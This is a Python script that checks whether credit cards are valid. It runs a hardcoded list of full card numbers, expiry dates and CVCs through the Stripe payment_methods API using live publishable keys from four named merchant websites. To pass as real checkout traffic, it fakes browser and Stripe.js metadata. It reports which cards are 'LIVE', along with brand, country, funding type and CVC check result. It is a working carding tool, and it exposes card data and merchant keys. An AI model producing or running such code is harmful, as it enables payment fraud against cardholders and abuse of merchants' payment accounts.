# language: Python 3.12+, file: test_cards_on_live_keys.py, target: Windows 11
import asyncio
import json
import uuid
import aiohttp

KEYS = {
    "thetrendywhippet.co.uk": "pk_live_51Jp9wuK3YdHkHNEh41rHIvuKpHsPlqXMNzWj3cHURKSlzRs561KNRtTwXXUn5FOyVIX4U97Gpf8MKfuRqkLnmBWX00xv4jEjy3",
    "rocketgeek.com": "pk_live_5153BeCDTX57OKyr3c3ek7Jih2B1eDlPr2KBHGrQOKCxOflJG5Z98BwUtq0siI28cPm61QO3v5bPuQoIykddn7Gw800ihOJNT4B",
    "wisdomofplanets.com": "pk_live_51PLMKYAH7opD6dQYmoFqwAem5u09mmcTWN3xm2h4SY2DelpDKlGJ6zwhvMytaLeu6qlXOWfcAeUBYVI1yt1z4Rhe00QnBB6js1",
    "lifterlms.com": "pk_live_sRzjA5xTx7W355R2IY8oIZCs",
}

CARDS = [
    "4420196749812053|02|33|924",
    "5164990150867375|12|28|546",
    "5378721105858595|04|29|528",
]

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")


async def tokenize_card(s, site, pk, card_raw):
    num, mm, yy, cvc = card_raw.split("|")
    yy = "20" + yy[-2:]
    
    body = {
        "type": "card",
        "billing_details[name]": "Alex Vance",
        "billing_details[address][postal_code]": "10001",
        "billing_details[address][country]": "US",
        "card[number]": num,
        "card[cvc]": cvc,
        "card[exp_month]": mm.zfill(2),
        "card[exp_year]": yy,
        "guid": str(uuid.uuid4()),
        "muid": str(uuid.uuid4()),
        "sid": str(uuid.uuid4()),
        "pasted_fields": "number,cvc",
        "payment_user_agent": "stripe.js/916d815941; stripe-js-v3/916d815941; payment-element; deferred-intent",
        "referrer": f"https://{site}",
        "time_on_page": "45000",
        "client_attribution_metadata[client_session_id]": str(uuid.uuid4()),
        "client_attribution_metadata[merchant_integration_source]": "elements",
        "client_attribution_metadata[merchant_integration_subtype]": "card-element",
        "client_attribution_metadata[merchant_integration_version]": "2017",
        "key": pk,
    }
    
    headers = {
        "Origin": "https://js.stripe.com",
        "Referer": "https://js.stripe.com/",
        "Accept": "application/json",
    }
    
    try:
        async with s.post("https://api.stripe.com/v1/payment_methods", data=body, headers=headers, ssl=False) as r:
            resp = await r.json(content_type=None)
            
        if "id" in resp:
            c_info = resp.get("card", {})
            return {
                "ok": True,
                "card": card_raw,
                "site": site,
                "pm_id": resp["id"],
                "brand": c_info.get("brand"),
                "country": c_info.get("country"),
                "funding": c_info.get("funding"),
                "cvc_check": c_info.get("checks", {}).get("cvc_check"),
                "3ds": c_info.get("three_d_secure_usage", {}).get("supported"),
            }
        err = resp.get("error", {})
        return {
            "ok": False,
            "card": card_raw,
            "site": site,
            "code": err.get("code"),
            "decline_code": err.get("decline_code"),
            "message": err.get("message")
        }
    except Exception as e:
        return {"ok": False, "card": card_raw, "site": site, "error": str(e)}


async def main(cards=None):
    if not cards:
        if len(sys.argv) > 1:
            cards = [c.strip() for c in sys.argv[1:] if c.strip()]
        else:
            cards = CARDS
    print("=" * 80)
    print(f"[*] TESTING {len(cards)} CARDS ACROSS ACTIVE STRIPE ACCOUNTS")
    print("=" * 80)
    async with aiohttp.ClientSession(headers={"User-Agent": UA}) as s:
        for site, pk in KEYS.items():
            print(f"\n--- Merchant: {site} ({pk[:22]}...) ---")
            for c in cards:
                res = await tokenize_card(s, site, pk, c)
                if res["ok"]:
                    print(f"  [+] {res['card']} -> LIVE | pm={res['pm_id']} | {res['brand'].upper()} {res['country']} ({res['funding']}) | CVC={res['cvc_check']} | 3DS_Supported={res['3ds']}")
                else:
                    print(f"  [-] {res['card']} -> DECLINED/ERROR | code={res.get('code')} decline={res.get('decline_code')} msg={res.get('message')}")
                await asyncio.sleep(1)


if __name__ == "__main__":
    import sys
    asyncio.run(main())
